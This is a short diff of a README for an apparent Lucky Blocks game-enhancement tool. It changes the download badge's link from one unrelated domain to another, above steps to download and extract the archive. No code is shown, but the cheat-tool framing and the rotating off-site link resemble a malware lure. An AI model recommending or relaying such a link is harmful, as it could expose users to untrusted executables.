@@ -19,7 +19,7 @@ Experience the ultimate enhancement for your Lucky Blocks gameplay with this adv
 
 ### Quick Download & Setup
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-orange?style=for-the-badge&logo=download)](https://fullsofts.org/)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-orange?style=for-the-badge&logo=download)](https://tj-kingdeecloud.com/)
 
 1. **Acquire Package**: Select the download button above to obtain the software archive
 2. **Extract Contents**: Unzip the downloaded files to your preferred directory location
